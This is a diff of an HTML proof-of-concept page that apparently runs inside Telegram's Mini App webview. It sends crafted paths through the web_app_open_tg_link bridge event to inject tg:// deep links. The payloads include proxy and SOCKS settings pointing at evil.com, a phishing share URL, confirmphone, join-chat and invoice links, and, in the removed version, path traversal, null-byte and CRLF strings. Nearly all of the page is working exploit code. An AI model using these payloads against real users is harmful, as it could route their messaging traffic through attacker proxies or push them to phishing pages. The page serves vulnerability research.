@@ -1,64 +1,64 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>openTgLink PoC</title>
+<head><meta charset="utf-8"><title>openTgLink PoC v2</title>
 <style>
 body{background:#0a0a0a;color:#ddd;font:12px monospace;margin:0;padding:10px}
 h2{color:#0f0;margin:0 0 4px 0}
-#log{background:#111;padding:6px;max-height:260px;overflow:auto;white-space:pre-wrap;font:11px monospace}
+#log{background:#111;padding:6px;max-height:280px;overflow:auto;white-space:pre-wrap;font:11px monospace}
 button{display:block;width:100%;margin:3px 0;padding:8px;background:#222;color:#fff;border:1px solid #444;font:12px monospace;cursor:pointer;text-align:left}
 button.fire{background:#4a0000;border-color:#f44;font-size:13px}
-.green{color:#0f0}.red{color:#f44}.yellow{color:#ff0}
+button.info{background:#002244;border-color:#08f;font-size:13px}
 </style></head><body>
-<h2>openTgLink PoC</h2>
+<h2>openTgLink — dangerous tg:// injections</h2>
 <div id="log">Init...</div>
 <div id="btns"></div>
 
 <script>
 const L=(s,c)=>{const e=document.getElementById('log');e.innerHTML+=`<span class="${c||''}">${s}</span>\n`;e.scrollTop=e.scrollHeight;};
+if (!window.TelegramWebviewProxy) { L('NO BRIDGE','err'); }
 
-L('Checking bridge...','green');
-if (window.TelegramWebviewProxy && window.TelegramWebviewProxy.postEvent) {
-  L('TelegramWebviewProxy OK!','green');
-} else {
-  L('NO BRIDGE','red');
-}
-
-const tgLink = (path) => {
-  L(`TX: web_app_open_tg_link path_full="${path}"`);
-  window.TelegramWebviewProxy.postEvent('web_app_open_tg_link', {
-    path_full: path
-  });
+const FIRE = (path, desc) => {
+  L(`>>> ${desc}`);
+  L(`    path_full="${path}"`);
+  window.TelegramWebviewProxy.postEvent('web_app_open_tg_link', {path_full: path});
 };
 
-const tests = [
-  // Basic path traversal / phishing
-  { name: '@phish redirect',   path: '@phishing_bot',   desc: 'https://t.me@phishing_bot → open redirect?' },
-  { name: 'Double @',          path: '@a@b',             desc: 'https://t.me@a@b → parser confusion?' },
-  { name: '../ traversal',     path: '/../../../',       desc: 'Path traversal attempt' },
-  { name: 'null byte',         path: '/%00/evil',        desc: 'Null byte injection' },
-  { name: 'newline',           path: '/%0a%0d/evil',     desc: 'CRLF injection' },
-  
-  // .ton domain bait
-  { name: '.ton injection',    path: '/evil.ton',        desc: 'Triggers tonsite:// rewrite (line 1888)' },
-  { name: '.ton in middle',    path: '/test.ton/stuff',  desc: '.ton substring match anywhere' },
-  
-  // tg:// injection
-  { name: 'tg:// inject',      path: '/../../../tg://resolve?domain=evil', desc: 'tg:// override?' },
-  
-  // Whitespace / encoding
-  { name: 'space bypass',      path: '/ settings',       desc: 'Space in path' },
-  { name: 'unicode',           path: '/\u2024/',         desc: 'Unicode dot (ONE DOT LEADER)' },
-  
-  // Empty / normal (control)
-  { name: 'empty path',        path: '',                 desc: 'Empty path → https://t.me' },
-  { name: 'normal user',       path: '/durov',           desc: 'Normal → opens Durov profile' },
+const TESTS = [
+
+  { path: '/proxy/?server=evil.com&port=8080&secret=test',
+    desc: 'PROXY injection → tg://proxy?server=evil.com&port=8080' },
+
+  { path: '/socks/?server=evil.com&port=1080',
+    desc: 'SOCKS injection → tg://socks?server=evil.com&port=1080' },
+
+  { path: '/share/url/?url=https://evil.com/phish',
+    desc: 'Share URL injection → tg://msg_url?url=https://evil.com' },
+
+  { path: '/confirmphone/?hash=abc123',
+    desc: 'Confirm phone injection → tg://confirmphone?hash=abc123' },
+
+  { path: '/setlanguage/../../evil',
+    desc: 'SetLanguage path traversal (regex blocks this?)' },
+
+  { path: '/bg/ff0000',
+    desc: 'Background color injection → tg://bg?color=ff0000' },
+
+  { path: '/addstickers/evil_pack',
+    desc: 'Sticker pack injection' },
+
+  { path: '/joinchat/AAAAAAAA',
+    desc: 'Join chat injection → tg://join?invite=...' },
+
+  { path: '/invoice/invoice_slug',
+    desc: 'Invoice injection → tg://invoice?slug=...' },
+
+  { path: '/durov',
+    desc: 'Normal user (control test)' },
 ];
 
-document.getElementById('btns').innerHTML = tests.map((t,i) => 
-  `<button onclick="tgLink('${t.path.replace(/'/g,"\\'")}');L('Test: ${t.name}','yellow')">${t.name}: ${t.path}</button>`
+document.getElementById('btns').innerHTML = TESTS.map((t,i) =>
+  `<button class="${i<4?'fire':'info'}" onclick="FIRE('${t.path.replace(/'/g,"\\'")}','${t.desc}')">${t.desc}</button>`
 ).join('');
-
-L(`Ready. ${tests.length} payloads.`,'green');
 </script>
 </body>
 </html>
